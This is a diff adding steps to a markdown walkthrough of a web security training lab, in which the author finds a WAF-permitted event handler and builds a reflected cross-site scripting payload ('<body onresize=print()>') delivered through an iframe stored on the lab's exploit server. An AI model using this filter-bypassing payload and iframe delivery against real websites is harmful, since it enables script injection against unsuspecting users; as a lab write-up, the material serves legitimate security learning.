@@ -191,13 +191,66 @@ To solve the lab, perform a cross-site scripting attack that bypasses the WAF an
 <img width="1490" height="508" alt="image" src="https://github.com/user-attachments/assets/43dd89c5-cea1-4c6f-9048-82fd4353fd18" />
 
 - After change in `onerror` to our text that we found, and also in this i change it to ``:
+````
+<body onreisze=alert()>
+````
 <img width="1495" height="855" alt="image" src="https://github.com/user-attachments/assets/4921f38e-3adc-4e06-b0ff-74fafc52db29" />
 
 
+- After if i type this it our target:
+````
+<body onresize=alert()>
+````
+<img width="730" height="771" alt="image" src="https://github.com/user-attachments/assets/ba8d21dd-9de8-4e23-b4f9-34020a1b9d50" />
+
+- After click `Search` we don't see anything:
+````
+<body onresize=alert()>
+````
+<img width="952" height="684" alt="image" src="https://github.com/user-attachments/assets/36b4c442-8648-403d-b2d7-446662bcf145" />
+
+- We see nothing:
+<img width="962" height="401" alt="image" src="https://github.com/user-attachments/assets/3504156c-22fa-4bbd-b9ef-54fd8f50ad31" />
+
+<img width="1918" height="746" alt="image" src="https://github.com/user-attachments/assets/b9484502-9a49-4285-91f4-6823f87000b0" />
+
+- After we see this, but it not mean we solve this lab:
+<img width="1817" height="940" alt="image" src="https://github.com/user-attachments/assets/23eea7c9-fd1f-427f-8d5f-887cdd61ffd8" />
+
+<img width="1919" height="694" alt="image" src="https://github.com/user-attachments/assets/b0f75900-84ee-4a1e-bce0-2b603869a4b9" />
+
+- After click on `Go to exploit server`:
+<img width="1477" height="597" alt="image" src="https://github.com/user-attachments/assets/6abf817b-7584-4c7d-9f19-869b76bce2f4" />
+
+- After in this i open my `notpad` to note my payload:
+<img width="1526" height="738" alt="image" src="https://github.com/user-attachments/assets/20fa57cd-d94f-4237-9ebb-c39b852ea495" />
+
+- And then in our brower back to `Search` place:
+<img width="1919" height="756" alt="image" src="https://github.com/user-attachments/assets/cca6994a-5372-429f-bed3-32b8e7187cf4" />
+
+- After we cracft payload:
+````
+<iframe src="https://0a0b00320340784680049937009d002d.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'>
+````
+<img width="1527" height="420" alt="image" src="https://github.com/user-attachments/assets/6fbadb58-b1fd-44c8-ac59-3c5f781d030c" />
 
 
+- And then in `<body onresize=alert()>` is our `payload` that we succeed to brute force.
+- And `onload=this.style.width='100px'`:
+This is an inline JavaScript event handler attached to an HTML element (in your case, an `<iframe>`). Here's what it means:
+  - `onload`: This event fires when the element (like an iframe or image) finishes loading.
+  - `this.style.width='100px'`: When the element loads, it sets its own width to `100px`.
 
 
+- Now we was successful for craft `payload` for send to victim:
+````
+<iframe src="https://0a0b00320340784680049937009d002d.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'>
+````
+- And after go back to to `Exploit Server`:
+<img width="1526" height="1017" alt="image" src="https://github.com/user-attachments/assets/d5db4bef-c41e-440c-8815-defcab4d72b1" />
+
+- Delete text `Hello, world!` -> and change to our payload URL above -> after click on `Store`:
+<img width="968" height="828" alt="image" src="https://github.com/user-attachments/assets/b5fbd027-b09f-4da3-b96b-dbcba8178f88" />
 
 
 
